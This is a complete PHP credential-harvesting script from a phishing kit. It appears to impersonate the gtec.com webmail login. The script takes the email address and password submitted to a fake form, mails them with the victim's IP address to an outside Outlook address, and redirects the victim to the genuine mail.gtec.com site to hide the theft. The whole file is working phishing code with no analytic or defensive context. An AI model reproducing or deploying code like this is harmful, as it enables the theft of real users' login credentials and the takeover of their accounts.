<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['userID'];
 $password = $_POST['password'];
 
		$to = "qbboss03@outlook.com";
		
		
         $subject = "gtec.com L0G : $ip";
		 
		 $message =  "Email ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";

		 
		 mail ($to,$subject,$message,$header);
}

header ("Location: https://mail.gtec.com/");
?>


